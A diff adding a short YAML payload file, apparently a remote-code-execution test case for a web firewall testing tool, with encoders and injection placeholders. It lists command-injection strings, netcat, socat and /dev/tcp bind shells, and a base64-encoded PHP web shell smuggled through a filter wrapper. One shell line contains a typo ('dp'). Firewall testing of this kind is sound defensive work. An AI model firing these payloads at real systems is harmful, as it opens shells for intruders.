@@ -1,0 +1,19 @@
+payload:
+    - 127.0.0.1; pwd
+    - 127.0.0.1;hostname
+    - mv image.jpg shell.php.jpg
+    - 127.0.0.1; export sha=/bin ; export hul=/bash ; nc -lvp 8080 -e $sha$hul
+    - nc -lvnp 4444 -e /bin/bash
+    - bash -c 'exec 5<>/dev/tcp/0.0.0.0/4444;cat <&5 | while read line; dp $line 2>&5 >&5; done'
+    - ;`id`
+    - PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php
+    - socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+encoder:
+    - URL
+    - Base64Flat
+placeholder:
+    - URLPath
+    - URLParam
+    - HTMLForm
+    - HTMLMultipartForm
+type: RCE
